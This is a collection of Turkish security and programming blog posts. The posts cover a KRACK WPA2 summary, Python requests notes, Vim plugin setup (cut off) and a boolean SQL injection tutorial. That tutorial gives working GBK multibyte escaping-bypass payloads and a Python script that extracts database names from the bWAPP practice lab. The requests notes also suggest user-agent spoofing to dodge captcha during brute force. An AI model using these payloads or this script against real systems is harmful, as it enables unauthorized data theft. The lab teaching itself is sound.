{"pages":[{"url":"http://musana.net/yazilar/2017/krack-network-trafigini-dinleme.html","text":"Bu zafiyet, WPA ve WPA2 kullanan ağlarda protokolden kaynaklıklı bir zafiyettir. Bu yüzden, zafiyet birçok platformu ve milyonlarca cihazı etkileyecek kadar kapsam genişliğine sahiptir. Bu zafiyet ile kablosuz ağın şifresini alamazsınız/bulamazsınız. Zafiyet, dahil olmadığınız bir ağda Man-in-The-Middle(MiTM) yapmanıza imkan tanımaktadır. Böylelikle ağda istenilen client(lar)a ait traffik rahatlıkla sniff edilebilir. SSLStrip kullanılarak daha kritik bilgiler (ç)alınabilir. En kısa zamanda cihazınızın güncellemesini alınız. Zafiyete ait detaylar ve poc videosuna burdan ulaşabilirsiniz. Bu post en kısa zamanda tekrar güncellenecektir. Güvenli günler dilerim.","tags":"Misc","title":"Wpa/Wpa2 Ağlarda KRACK İle Ağ Trafiğini Dinleme"},{"url":"http://musana.net/yazilar/2016/boolean-sql-injection-and-python-exploit-tool.html","text":"Giriş & Boolean sqli nedir? Sqli bir çok varyasyonu olan bir web uygulama zafiyettir. Ancak hepsinde hedeflenen izinsiz bir şekilde sql sorgusu çalıştırmaktır. Türlerine göre bazılarını istismar etmek çok kolay olsada bazıları için ise fazladan uğraş verilmesi gerekir. Bu tür durumlarda işi otomatize hale getirmek için yazılan ufak toollar, zamandan tasarruf etmek açısından çok başarılı olabilmektedir. Sqli için ise birçok tool mevcut olmasına karşın hatta bizim yazacağımız tooldan bile daha işlevsel olmalarına rağmen bu yazıda kendi toolumuzu yazarak şunu hedefliyoruz aslında; hem zafiyetin arkasındaki mantığı anlamak hemde toollar nasıl yazılır konusunda bir nebzede olsa fikir sahibi olmak. Bu arada sqlmap varken neden böyle bir atraksiyona girişelim sorusu da cevap buldu sanırım. Öte yandan bir zafiyeti istismar ederken kendi ihtiyaçlarınıza göre ufak toolar yazarak pozitif sonuçlar alacak seviyedeyseniz zaten var olan tooları kullanmanızda bir sakınca yok bence. Biz sadece ezbere karşıyız. Mottomuz: Tool kullanmayı değil, tool yazmayı öğret. Konumuza dönecek olursak; boolean sql injection zafiyeti, enjecte edilen sql cümlesinin sadece doğru mu? yanlış mı? olduğu bilgisini veren/sızdıran bir sqli türüdür. Bu sızma; bazen sayfanın tasarımının bozulması sebeb olurken, bazen sayfada değişmeler meydana getirebilir veya birazdan çözeceğimiz örnekte olduğu gibi (geliştirici tarafından dikkat edilmeden) bize sql sorgumuzun doğru veya yanlış olduğu hakkında aslında çok büyük ipucu veren bir çıktı/cümle olabilir. Biz artık veritabanı adından tutun da sutunlardaki bütün verilere kadar herşeyi sorgumuz doğru mu? yanlış mı? cevabı üzerinden giderek çekebileceğiz. Son derece tehlikelidir. Kolaylıkla exploit edilebilir. Harcanan zaman bakımından time based kadar uğraştırmasada diğer sqli çeşitlerine göre exploit etmek biraz daha zaman almaktadır. Bu yazının ana konusu her ne kadar boolean sqli ve exploit toolunun yazılması olsada birazdan çözeceğimiz caseden dolayı mysql_real_escape_string() ve addslashes() fonksiyonlarına da değinmek istedim. Bundan dolayı şu bağlantıdaki birçok zafiyet barındıran web uygulamasını indirerek gerekli ayarları yapınız. Yazının dolu dolu olabilmesi adına güvenlik seviyesini high yaparak sadece boolean sqli değil aynı zamanda mysql_real_escape() ve addslashes() fonksiyonlarının nasıl bypass edilebileceğini de göreceğiz. Listeden A1 kategorisindeki sql injection-blind-boolean based olanı seçiniz. Uygulamamız high seviyesinde iken aşağıdaki resimde de görmüş olduğunuz üzere kullanıcıdan alınan girdi mysql_real_escape_string() fonksiyonundan; medium seviyesinde ise addslashes() fonksiyonundan geçirilmiştir. Öncellikle uygun payloadı yazabilmemiz için mysql_real_escape_string() ve addslashes() fonksiyonlarının nasıl çalıştığını bilmemiz gerekir. Aslında bu iki fonksiyon arasında nüans olsada aynı işi yapmaktadırlar. addslashes() fonksiyonun ifa ettiği işlem; \", ', \\, \\x00 karakterlerini escape etmektedir. mysql_real_escape_string() fonksiyonu ise addslashes() fonksyionunun escape ettiği karaktelere ek olarak cr(\\r) , lf(\\n) ve EOF(\\x1a) özel karakterlerini de escape etmektedir. Ayrıca mysql_real_escape_string() fonksiyonunun bir veritabanı fonksiyonu olduğu unutulmamalıdır. Yani herhangi bir veritabanı bağlatısı yok ise kullanmanız durumunda hata alırsınız. İki fonksiyonun kullanımıyla ilgili görüntüler; addslashes() mysql_real_escape_string() Resimlerden de anlaşılacağı üzere kaçış karakterleri, programlama dili için özel anlamı olan karakterlerin, özel anlamları dışında normal bir string ifadeymiş gibi kullanmamızı sağlayan yapıdır. Buraya kadar herşey iyi güzel ancak bu fonksiyonlar zaten sql injection, xss gibi web zafiyetlerinin önüne geçebilmek için yazılmış fonksiyonlar olmasına rağmen nasıl bypass edilebiliyor şimdi ona bakalım. Kullanırken Dikkat! Normal şartlarda mysql_real_escape_string() veya addslaheses() fonksiyonları exploitable değildir. Ancak bu fonksiyonlar kullanılırken 2 önemli nokta gözden kaçırılır ise o zaman zafiyete sebep verilmiş olur. Tırnak işareti arasına yazmak? 1) Dışarıdan aldığınız girdiyi(bu fonksiyonlardan geçirdikten sonra) tutan değişkeni sql cümlesinde yazarken tırnak işareti içerisine yazmalısınız. Neden peki? $ id = mysql_real_escape_string ( $ _GET [ 'id' ]); # addslashes () fonksiyonuda olabilir . mysql_query ( \"SELECT * FROM uyeler WHERE id=$id\" ); Yukarıda görmüş olduğunuz üzere id parametresine verilen değerde bulunabilecek özel karakterler(', \") escape edilmektedir. Görünürde bir güvenlik probleminin olmadığı görnüyor AMA ya özel karakter yoksa? :) O zaman bu fonksiyonlara verien girdiler ne ise çıktılar aynısı olacaktır. Yukarıdaki sql cümleciği üzerinden gidersek kullanıcıdan gelen bir ' veya \" karakteri escape edileceltir ancak kullanıcı bu karakterileri kullanmadığı zaman hiçbir handikap ile karşılaşmayacaktır. Nihayetinde -1 or 1=1 payloadı sql cümlesine rahatlıkla enjecte edilebilir. \"-1\" yapmaktaki amacımız ise çok büyük ihtimal ile bu değere sahip bir id değer olmayacağından or dan sonraki yazacağımız sql sorgusu ile sorgunun doğru veya yanlış olduğu sonucunu çıkarabilecek kadar kontrol altına alabilmekteyiz. Sorgumuz aşağıdaki hale bürünecektir ve sorguda herhangi bir mantık ve syntax hatası olmadığından true dönecetir.(uyeler tablosundan id değeri -1 olan üyeyi seç veya 1=1 mi? -1 id numarasına sahip üye yok ancak veya ile cümle bağlandığı için 1=1 önermesinden dolayı true dönecektir.) SELECT * FROM uyeler WHERE id =- 1 or 1 = 1 Şimdi $id değişkenini herhangi bir tırnak işareti arasına yazdığımızda neden istismar edilemeyeceğini görelim. ... $ id = mysql_real_escape_string ( $ _GET [ 'id' ]); mysql_query ( \"SELECT * FROM uyeler WHERE id='$id'\" ); ... # payloadımızı ilgili alana yerleştirelim . mysql_query ( \"SELECT * FROM uyeler WHERE id='or 1=1--+'\" ) # Yukarıdaki sorguda her ne kadar sondaki tırnaktan kurtulsakta baştaki tırnaktan kurtulamıyoruz . Diğer taraftan tırnaktan kurtulmaya ç alışmaz isek bu sefer payloadımız normal bir string olarak işlem görecektir ve injection başarısız olacaktır . Karakter setine dikkat! 2) Databasede kullandığınız karakter setinin gbk veya big5 olmaması. Alakaya maydanoz :) Şimdi yukarıda anlatığımış olduğumuz; \"Değişkenin tırnak içerisine yazılması durumunda exploitable edilemez\" cümlesinin kısmen yanlış olduğunu gösterelim. Bu da doğrudan karakter setiyle ilgili bir durumdur. Nasıl mı? 0xbf5c(¿\\) karakteri GBK ve big5 karakter setlerinde multibyte bir karakterdir(Bunlar dışında 0xbf5c ifadesinin multibyte olarak kabul edildiği başka karakter setleri de olabilir.) 0xbf(¿) ve 0x5c(\\) birbirlerinden bağımsız değildir. Başka bir ifadeyle ¿\\ karakteri tek bir karakter olarak işleme alınır. Böyle bir durumda kullanıcıdan 0xbf27(¿') girdisinin geldiğini varsayıp bu değeri mysql_real_escape_string() veya addslashes() fonksiyonların birinden geçirdiğimizi düşünürsek bunun doğal sonucu olarak bize 0xbf5c27(¿\\') çıktısını verecektir. İşte olayın püf noktası 0xbf5c(¿\\) ifadesinin tek bir karakter olarak işlem görmesinden dolayı tırnak işaretimizin 0x27(') boşa çıkmasıdır. Bingo! Artık sql sorgusunu istediğimiz şekilde manipüle edebiliriz. 0xe55c(å\\) ifadesi de multibyte bir karakterdir. Bu karakteri kullanarak da injection yapabilirsiniz. Bu arada yazının ileriki bölümlerinde ilgili fonksiyonları bypass edebilmemiz için karakter setinizi gbk veya big5 yapmayı unutmayınız! Aksi halde bypass edemezsiniz. $ id = $ _GET [ 'id' ]; mysql_query ( \"SELECT * FROM uyeler WHERE id='¿\\''\" ); # ¿\\ ifadesi tek bir karakter olarak işlendiği için syntax error hatası alınır . Tool'umuzu yazalım! Yukarıdaki gördüğünüz sonucu elde etmeye kadar geldiyseniz ve şimdiye kadar anlatıklarımı da anladıysanız bundan sonrasi çok kolay! Çünkü artık elimizde bir payload var ve bu payload üzerinden doğru/yanlış doğruluk değerleriyle bütün veritabanını dump edebiliriz. Evet yanlış duymadınız 5 kavanoz bal sadece 60tl..:) # True SELECT * FROM movies WHERE title = '¿\\' or 1 = 1 --+ # False : SELECT * FROM movies WHERE title = '¿\\' or 1 = 0 --+ Artık or ifadesinden sonra kendi sql sorgumuzu yazacağız ve yazacağımız sorgunun cevabı doğru mu? yanlış mı? şeklinde mantıksal olmalıdır. Misal; SELECT * FROM movies WHERE title = '¿\\' or substr (( SELECT schema_name FROM information_schema . schemata LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 97 ) --+ SELECT * FROM movies WHERE title = '¿\\' or substr (( SELECT schema_name FROM information_schema . schemata LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 98 ) --+ SELECT * FROM movies WHERE title = '¿\\' or substr (( SELECT schema_name FROM information_schema . schemata LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 99 ) --+ ... # Hepsini manuel yazacak değiliz : / Yukarıdaki sql sorgusu karışık gelmiş olabilir. Kısaca açıklarsak; substr fonksiyonu bir string ifade parçalamamıza yarayan bir mysql fonksiyonudur. information_schema veritabanındaki schemata tablosundaki schema_name sutunundaki ilk veriyi al. Aldığın bu verinin 1 karakterinden başlayarak 1 karakter al.(Diğer bir deyişle \"ilk harfi\") İlk harf a'ya eşit mi? Eşit ise \"The movie exist in our database!\" cümlesi çıkacak, değil ise \"The movie does not exists in our database!\" cümlesi çıkacak. Aşağıdaki gif herşeyi anlatıyor. Harfler char olduğundan dolayı tırnak işaretleri içerisine yazmamız gerekirdi bu nedenle tırnaklardan kaçmak için ascii tablosundaki karakterlerin sayısal değerini karaktere dönüştüren char() fonksiyonunu kullanarak tırnak işaretinden kaynaklı olası bir syntax hatasından kurtulmuş olduk. Bu arada dikkatinizden kaçmasın, benim case-sensitive off, siz artık duruma göre büyük harfleride olasılık dahiline katmak isterseniz ascii tablosundaki ilgili aralığı alabilirsiniz veya veritabanın bununla ilgili fonksiyonlarından istifade edebilirsiniz. Yukarıdaki gifte gördüğünüz üzere veri tabanındaki çekeceğimiz her kelimedeki harf için payloadımızda ilgili kısmı değiştirip tekrar tekrar denememiz lazım ta ki doğru harfi buluna kadar. Payloadımızdaki değişkenlerimiz belli. substr fonksiyonundaki parametre. eşitliğin sağ tarafı. limit değerimizdeki parametre Aslında tablo ve database değerlerimizde değişken ancak şimdilik fazla karmaşa olmasın. Şimdi kolarımızı sıvayalım ve python ile exploit toolumuzu yazmaya başlayalım. Başlangıç seviyesinde olduğunuzu düşünüyorsanız bu yazımı okuduktan sonra devam edin. Yazacağımız tool aşağıdaki algoritmayı izleyecektir. Bütün olası karakterleri tutan bir değişken/liste oluştur. Listeki bir sonraki karakteri(+1) url'de ilgili yere yaz. Payloadı da ihtiva eden isteği gönder. Dönen cevabı al. Cevabı parse et. Listedeki son eleman denendi mi? Evet ise 9. adıma git, hayır ise 7. adıma git Eğer does not kelimesi var ise 2. adıma git, hayır ise 8. adıma git. O an denenen harfi bir değişkende tut ve substr'nin ikinci parametresini 1 arttır ve 2. adıma git. Listedeki bütün elemanlar denenmesine rağmen sonuç negativ ise limit değerini 1 arttır ve payloaddaki değişkenlerini sıfırlayıp 2. adıma git. Bizim izleyeceğimiz algoritma yukarıdaki olacak ancak tabiki de farklı algoritmalar ile de çözüme ulaşılabilir. Örneğin doğru sorgu ile yanlış sorgu arasındaki tek fark does not kelimesidir. Pythonda beautifulsoup kütüphanesini kullanarak does not kelimesi yok ise doğru, var ise yanlış şeklinde bir çıkarsama ile çözüme ulaşabilirsiniz. Boolean sqli payload Toolumuzu yazmaya başlamadan önce kullanacağımız payloadları verelim. Bütün veritabanları isimlerini çekmek için; http : // localhost / bWapp / bwapp / sqli_4 . php ? title =% bf % 27 or substr (( SELECT schema_name FROM information_schema . schemata LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 97 ) --+&action=search--+ Aktif veritabanındaki tüm tablo isimlerini çekmek için; http : // localhost / bWapp / bwapp / sqli_4 . php ? title =% bf % 27 or substr (( SELECT table_name FROM information_schema . tables WHERE table_schema = database ()), 1 , 1 ) = CHAR ( 97 ) --+&action=search--+ Seçilen tablodaki tüm sutun isimlerini çekmek için; http : // localhost / bWapp / bwapp / sqli_4 . php ? title =% bf % 27 or substr (( SELECT column_name FROM information_schema . columns WHERE table_name = CHAR ( tablo_adi_decimal_değeri ) AND table_schema = database () LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 97 ) --+&action=search\" Seçilen sütundaki bilgileri çekmek için; http : // localhost / bWapp / bwapp / sqli_4 . php ? title =% bf % 27 or substr (( SELECT sutun_adi1 FROM table_adi LIMIT 0 , 1 ), 1 , 1 ) = CHAR ( 97 ) --+&action=search Tabi bu payloadlarımızda yukarıda bahsettiğimiz değişken kısımlarının değiştirilerek deneme/yanılma yöntemi ile harflerin tek tek bulunması gerekir. Bu da akıl alır gibi değil. Bu yüzden bunu otomatize hale getirmek için tool yazıyoruz ve artık boolean sqli zafiyetini exploit etmek için gerekli bilgiye ve payloadlara sahip olduğumuza göre başlayalım. import requests from bs4 import BeautifulSoup as bs from termcolor import cprint , colored # Bütün olası karakterlerlerin ascii tablosundaki sayısal aralıklarını alıyoruz. alfabe = list ( range ( 43 , 58 )) + list ( range ( 95 , 123 )) + list () # Uygulamamızda loginning olduğundan cookie değerimizi alıyoruz. login = { 'PHPSESSID' : 'cpfrrq0867totod6h7lhsv3nk5' , 'security_level' : '2' } Yukarıdaki aralığı siz kendi ihtiyacınıza göre genişletebilirsiniz. PHPSESSID ise giriş/çıkış durumlarında değiştiği için dikkat ediniz. Kodumuzun devamında ise iç içe 3 adet for döngüsü kuracağız. Bunlardan en dıştaki for; veritabanları, tablolar ve sutunların sayıları ile ilgili olacak. Kaç sutun, kaç tablo, kaç db bulmasını istersiniz? Orta kısımdaki for; veritabanı, tablo veya sutun isimlerindeki uzunluk ile ilgili olacak. En içteki for ise olasılık kümemizdeki bütün harfleri denemek için olacak. # Çekilecek veritabanı, tablo veya kolon sayısı for i in range ( 3 ): nxt = True # Çekilecek olan veritabanı, talo, veya kolon ismi uzunluğu for j in range ( 1 , 42 ): if nxt : for k in alfabe : url = \"http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT schema_name FROM information_schema.schemata LIMIT \" + str ( i ) + \",1), \" + str ( j ) + \",1)=CHAR(\" + str ( k ) + \")--+&action=search\" req = requests . get ( url , cookies = login ) # request send # nxt değişkenimiz ise doğru karakteri bolduğunda içteki döngüden çıkıp, substr parametresinin değerini bir arttırmak için kontrol değişkenimiz. beau = bs ( req . text , \"lxml\" ) # Dönen cevabı lxml formatında al. result = beau . find ( \"form\" ) . next_sibling #cevapta bulunan form elemanından sonraki etiketsiz stringi al. if not \"does not\" in result : # Result değişkenimizdeki stringde \"does not\" kelimesi var ise... cprint ( \"Found! \" + chr ( k ) + \" - \" + url , \"white\" , \"on_green\" ) #cprint modülü konsolda renkli çıktı vermek için fazla takılmayın buraya. print kullanabilirsiniz. db += chr ( k ) # Bulunan kelimeyi ilgili değişkene ekle. break #İçteki döngüden çık. else : # does not kelimesi geçiyor ise... cprint ( \"Failed! \" + chr ( k ) + \" - \" + url , \"white\" , \"on_red\" ) if chr ( k ) == \"z\" : #Olasılıklar kümemizdeki son eleman olan \"z\" denendi mi? db += \", \" cprint ( \"Veritabanı Adı: \" + db , \"white\" , \"on_cyan\" , attrs = [ 'bold' ]) with open ( \"data.txt\" , \"a\" ) as p : #Bulduğumuz tablo adları sutunlardaki veriler vs. metin dosyasına yazdık. p . writelines ( db + \" \\n \" ) nxt = False break else : break Her kodun neyi icra ettiğini kısaca ifade etmeye çalıştım ayrıca incelemek isteyen olur diye githuba da yükledim . Biliyorum tam otomatize bir tool olmadı. Çünkü veri tabanı isimlerini bulduktan sonra tablo isimlerini bulması için kaynak kodda yukarıda verdiğimiz payloadları kullanarak elle değiştirmeniz gerekir. Aynı işlemi sutün isimlerini bulduğunuz zamanda uyarlamanız gerekecektir. Github da duruyor zaten katkı sağlamak isteyen olursa ilgilenebilir. Neler eklenebilir? Öncellikle veri tabanı ismini bulduktan sonra tablo isimlerini bulması için payloadı kendisi generate edebilir ve yine aynı şekilde sutun isimleri ve veriler içinde yapılabilir. Bir payload listesi oluşturulup brute force ile zafiyet araması otomotik hale getirilebilir. Gittikçe sqlmap'e kayıyor, neyse. Tool bu istediğiniz kadar genişletebilirsiniz yani. Ancak anlatmak istediğim mantalitesiydi. Umarım başarmışımdır. Bi' selfie çekelim o zaman. Belki bir sqlmap değil ama iş görüyor sonuçta :) Sağlıcakla kalınız.","tags":"Security","title":"Boolean Sqli ve Exploit Tool"},{"url":"http://musana.net/yazilar/2016/python-request-module-notes.html","text":"requests minimalist bir python modülüdür. Bu modül ile en temel şekilde http/https protokollerine yönelik request/response işlemlerimizi gerçekleştirebiliriz. Requests modülünü pip ile kurmak için; pip3 install requests Kaynak koddan kurmak için ise; git clone git://github.com/kennethreitz/requests.git indirdiğiniz dizine girip python3 setup.py install diyerek kurabilirsiniz. Everything is request Artık modülümüzü kullanmaya başlayabiliriz. import request req = requests . get ( \"http://musana.net\" ) En basit haliyle; musana.net adresine get metoduyla bir istekte bulunduk ve artık elimizde req adında bir nesne mevcut. İstekte bulunduğumuz bağlantıya ait bütün bilgilere req nesnesi üzerinden erişebiliriz. HTTP metodları ile istek yapmak GET metodu ile ilgili parametre(ler)ye değer vermek veya POST metodu ile form elemanlarına değer verip göndermek için özellikle sözlük veri tiplerinden yararlanıyoruz. Aşağıdaki kod blogunu inceleyerek verilen parametreye bağlı olarak oluşan url yapısına dikkat ediniz. import requests req = requests . get ( \"http://musana.net\" , params = { 'par' : 'value' }) print ( req . url ) #Output: http://musana.net/?par=value req = requests . get ( \"http://musana.net\" , params = { 'par1' : 'value1' , 'par2' : 'value2' } print ( req . url ) #Output: http://musana.net/?par1=value2&par2=value2 req = request . get ( \"http://musana.net\" , params = { 'par1' : 'value1' , 'par2' :[ 'val1' , 'val2' , 'val3]} print ( req . url ) #Output: http://musana.net/?par1=value1&par2=val1&par2=val2&par2=val3 req = requests . post ( \"http://musana.net\" , data = { 'kullanici' : 'musa' , 'meslek' : 'talebe' }) #Yukarıdaki kod; name attributenün değeri 'kullanici' olan form elemanının value değerini `musa` ve diğer name attributenün değeri 'meslek' olanın value değerini `talebe` olacak şekilde post metodunu kullanarak request gönderecektir. Diğer HTTP metotlarını kullanarak request göndermek istediğimizde ise değişen tek şey metot isimleridir. import requests # Diğer http metodları ile istek yapmak req = reqeusts . head ( \"http://musana.net\" ) req = requests . delete ( \"http://musana.net\" ) req = requests . option ( \"http://musana.net\" ) req = requests . head ( \"http://musana.net\" ) HTTP Başlık Bilgisi Ekleme İstekte bulunurken HTTP başlık bilgilerini(Referrer, host, cookie, user-agent vs) eklemek isteyebiliriz. Bunun için methodumuza headers parametresini tanımlayacağız ve değerini ise sözlük veri tipini kullanarak {\"http-baslık-adı\":\"baslık-degeri\"} şeklinde vereceğiz. Örneğin bir web uygulamasının web sürümünde çıkan captcha, mobil sürümünde çıkmayabilir. Bu durumda kolaylıkla olası bir brute-force saldırısı düzenlenebilir. HTTP başlıklarından user-agent değerini mobil bir telefonun browser bilgilerini ekleyerek captcha'yı bypass edebiliriz. import requests req = requests . post ( http : // musana . net , headers = { 'user-agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36' } Yukarıdaki kod musana.net sitesine Samsung Glaxy S6 telefonunun kullanıdğı tarayıcı bilgilerini kullanarak istekte bulunacak ve hedef site gelen user-agent bilgisine göre cevap döndürecektir. Örneğimiz üzerinden gidersek captcha çıkmayacağı anlamına gelir bu. Diğer http header bilgilerini de aynı bu yöntemle istediğiniz şekilde değiştirebilirsiniz. HTTP Response İşlemleri İstek yaptığımıza göre artık dönen cevabı nasıl işleyebileceğimize bakalım. import requests req = requests . get ( \"http://musana.net\" , params = { 'par1' : 'value1' , 'par2' : 'value2' } print ( req . text ) # Dönen cevabı text formatına çevirdik. Artık normal bir string üzerinde yapabileceğiniz tüm işlemleri yapabilirsiniz. Yaptığımız isteğe karşılık dönen HTTP Response kodunu öğrenmek için ise; import requests req = reqeusts . get ( \"http://musana.net\" ) print ( req . status_code ) #Output: 200, 404?, 302?, 500? ... Sunucudan dönen cevabın başlık bilgilerine erişebilmek için ise request nesnemize headers nesne değişkeni üzerinden erişebiliriz. Bu değer bize bütün header response bilgisini sözlük tipinde verecektir. Daha spesifik başlıklara erişmek için sözlük yapısını kullanabiliriz. Örneğin; req.headers.get(\"content-type\") diyerek içeriğin hangi formatta ve hangi karakter setini kullandığı bilgisine ulaşabiliriz. Erişmeye çalıştığımız başlık değeri yok ise sonuç None dönecektir. import request req = requests . get ( \"http://musana.net\" ) print ( req . headers ) #Çıktımız: { 'CF-RAY' : '307f6aa1408a2bb2-AMS' , 'Server' : 'cloudflare-nginx' , 'X-GitHub-Request-Id' : 'ADF53550:23C34:E6E456:5839D4F6' , 'Date' : 'Sat, 26 Nov 2016 18:31:18 GMT' , 'Cache-Control' : 'max-age=600' , 'Set-Cookie' : '__cfduid=d1c34cf17ebe35c3c407a8ca97672e1951480185077; expires=Sun, 26-Nov-17 18:31:17 GMT; path=/; domain=.musana.net; HttpOnly' , 'Access-Control-Allow-Origin' : '*' , 'Content-Encoding' : 'gzip' , 'Expires' : 'Sat, 26 Nov 2016 18:41:18 GMT' , 'Content-Type' : 'text/html; charset=utf-8' , 'Connection' : 'keep-alive' , 'Transfer-Encoding' : 'chunked' , 'Last-Modified' : 'Fri, 18 Nov 2016 11:31:04 GMT' } # Sadece istenilen başlık değerine ulaşmak istersek; print ( req . headers . get ( \"content-type\" )) # Output: text/html; charset=utf-8 print ( req . headers . get ( \"content-encoding\" )) # Output: gzip Dosya Göndermek Her zaman string bir ifade göndermeyebiliriz. Karşı sunucuya bir dosya yüklemek isteyebiliriz bunun için ise files parametresini tanımlayıp değerine sözlük veri tipi yardımıyla bir dosya adı veya dosya içeriğini veriyoruz. import requests dosya = { \"dosyam\" : open ( \"python.txt\" , \"rb\" )} #name değeri dosyam olan form elemanını python.txt dosyamıza binary form req = requests . post ( \"http://musana.net\" , files = dosya ) Bir string ifadeyi istediğimiz bir dosya formatında göndermek için ise; import requests dosya = { \"dosyam\" :( \"python.txt, \" Burası python . txt dosyasına yazılmaktadır . \")} req = requests . post ( \"http://musana.net\" , files = dosya ) Timeout, SSL, HTTP Basic Auth Göndereceğimiz isteğin zaman aşım süresini kontrol etmek isteyebileceğimiz durumlar olabilir. Bu durumda timeout parametesine dönecek olan cevabın verdiğimiz zaman değerini aşması durumunda isteğimiz zaman aşımına uğrayacaktır. Meydana gelen ConnectTimeoutError hatasını exception handling ile kontrol edebiliriz. import requests req = requests . get ( 'http://github.com' , timeout = 0.099 ) # İstek yapıldıktan sonra 99 milisaniye sonra cevap dönmez ise timeout meydana gelir. Request göndereceğimiz bağlantının SSL desteği varsa yani HTTPS protokolünü kullanıyorsa bağlanmak istediğimiz zaman requests.exceptions.SSLError hatasını alabiliriz. Bu durumda verify parametresine sertifika yolumuzu belirterek istek gönderebiliriz. import requests requests . get ( 'https://github.com' , verify = '/sertifikanızın/dizin/adresi' ) Ayrıca verify parametresine False değerini vererek doğrulanmış SSL sertifikasını göz ardı edebilirsiniz. HTTP Basic Authentication kimlik doğrulamasında login olabilmek için ise; from requests.auth import HTTPBasicAuth requests . get ( 'https://api.github.com/user' , auth = HTTPBasicAuth ( 'user' , 'pass' )) requests modülünü kullanarak yapabileceğimiz en temel işlemler bunlar olmakla beraber daha fazlası için resmi dökümantasyonu inceleyebilirsiniz. Sağlıcakla kalınız.","tags":"Python","title":"Python Request Modülünü Kullanmak"},{"url":"http://musana.net/yazilar/2016/vim-editor-ipuclari.html","text":"GNU projesinin nimetlerinden biri olan Vim(Vi IMprove) özellikle *nix sistemlerde kullanılan konsol tabanlı bir editördür. (Gui sürümleri de mevcut) Fonksiyonel, stabil ve güçlü bir editör olmasının yanında, vimi kişileştirmek için gönüllü geliştiriciler tarafından yüzlerce plugin de yazılmıştır. Uzun süre Sublime text ile haşır neşir olmuş biri olarak vim şuan vazgeçilmezim haline geldi. Alıştıktan sonra Vim'in çok güçlü bir editör olduğunu farkedeceksiniz. Ayrıca bütün linux dağıtımlarında pre-installed olarak geldiğinden dolayı öğrenmeniz size büyük avantaj sağlayacaktır. İşte bu yazımızda default gelen vim özelliklerine yenilerini ekleyip arayüzünde de ufak değişiklikler yaparak daha estetik ve efektif bir hale getireceğiz. Eğer kullandığınız dağıtım debian tabanlı ve vim yüklü değil veya güncel değilse sudo apt-get install vim komutu yardımıyla vimi kurunuz/güncelleyiniz. Bizim yapacağımız işlemler için kullandığınız sürümün >7.3 olması gerekmektedir. Terminale vim --version yazarak kullandığınız sürümü öğrenebilirsiniz. Vim'i özelleştirmek için kullanacağımız pluginleri tek tek manuel bir şekilde indirip kurmak yerine kullanıcıların zamandan kazanması için geliştiril(mekte)miş olan bir çok plugin manager bulunmaktadır. (Pythondaki pip gibi düşünebilirsiniz.) Bizde bunlardan birini kullanarak yolumuza devam edeceğiz. Bu noktada bizim tercihimiz vundle dan yana olacaktır. Vundle vim'e plugin yüklemizi sağlayan birçok plugin managerdan sadece biri. Alternatiflerinden bazıları; vim-lug , janus , vim-apt ve pathogen . Yani; in linux, there is too many alternatives all the time. that's another reason for using open source. diyerek subliminal mesajımızı verelim :) Plugin yöneticimizi kurmakla başlayalım. git clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim Yukarıdaki komut yardımıyla repoyu ~/.vim/bundle/Vundle.vim dizinimize indiriyoruz. Artık pluginlerimiz ile ilgili configrasyon ayarlarımızı .vimrc dosyası üzerinden gerçekleştireceğiz. Bu nedenle home dizinimizde .vimrc adında oluşturup aşağıdaki kodları dosyamıza yapıştıralım.(Oluşturmak için touch ~/.vimrc ) set nocompatible filetype off \" vundle.vim pathini belirtiyoruz. set rtp +=~ /.vim/ bundle/Vundle. vim call vundle#begin () Plugin 'VundleVim/Vundle.vim' \" PLUGINLERIMIZIN ADINI YAZACAĞIMIZ KISIM [BAŞLANGIÇ] \" Github reposundan plugin yüklemek için Plugin 'tpope/vim-fugitive' \" http://vim-scripts.org/vim/scripts.html bu bağlatıdan plugin yüklemek için Plugin 'L9' \" Git'den plugin yüklemek.(github üzerinde olmayan pluginler) Plugin 'git://git.wincent.com/command-t.git' \" local makinadan plugin yüklemek için Plugin 'file:///home/gmarik/path/to/plugin' \" PLUGINLERİMİZİN ADINI YAZACAĞIMIZ KISIM [BİTİŞ] call vundle# end () filetype plugin indent on Vim'e Plugin Yüklemek Bu adresten kendimize uygun plugin(ler)i buluyoruz. Kullanmak istediğimiz pluginin github sayfasına giderek url adresindeki username/repo_name şeklinde kopyalıyoruz. Örneğin pluginin github adresi şöyle ise; https://github.com/ scrooloose/nerdtree kırmızı renkli kısmı tek alıyoruz. Daha sonra yukarıda görmüş olduğunuz call vundle()#begin kodu ile call vundle()#end arasında herhangi bir yere Plugin 'Plugin_name' yazıyoruz. Örneğin Plugin 'scrooloose/nerdtree' Son olarak vim'de iken ctrl+c yapıp :PluginInstall veya :BundleInstall komutunu verip pluginlerimizi yükleyelim. Yada vim'den çıkıp terminale vim +PluginInstall +qall komutunu yazarak da işlemimizi tamamlayabiliriz. Yüklemek istediğiniz pluginin adının call vundle()#begin kodu ile call vundle()#end kodu arasında olmasına dikkat ediniz. Ayrıca vundle'ın önceki sürümlerinde plugin kelimesi yerine bundle kelimesi kullanılmaktaydı. Yukarıdaki dosyada plugin yerine bundle da yazarsanız sorun olmayacaktır yani. Özetle artık yapacağımız şey çok basit; yüklemek istediğimiz pluginin github adresinin dediğimiz kısmını kopyalayıp .vimrc dosyasını açarak yukarıda bahsettiğimiz kısma Plugin 'plugin-adı' veya Bundle 'plugin-adı yazıp PluginInstall komutuyla kuruyoruz. Kurulum işlemine ait ekran görüntüsü aşağıdaki gibidir. \" Yardımcı olabilecek birkaç komut. : PluginList \"yüklü pluginleri listele : PluginInstall \"plugin yükle : PluginUpdate \"plugin güncelle : PluginClean \"plugin silmek için Hepsi bu. Pratik yapmak için birkaç plugin kuralım. En çok hoşuma giden pluginlerden biri olan otomotik bir şekilde indent bırakan indentpython kuralım. Terminale sudo sudo vim ~/.vimrc yazarak config dosyamızı açalım ve Plugin 'vim-scripts/indentpython.vim' yazıp :PluginInstall komutuyla kuralım. Örnek bir python kodu yazarak indentleri kendisinin bıraktığını test edebilirsiniz. Güzel bir status bar olan powerline kurmak için ise; 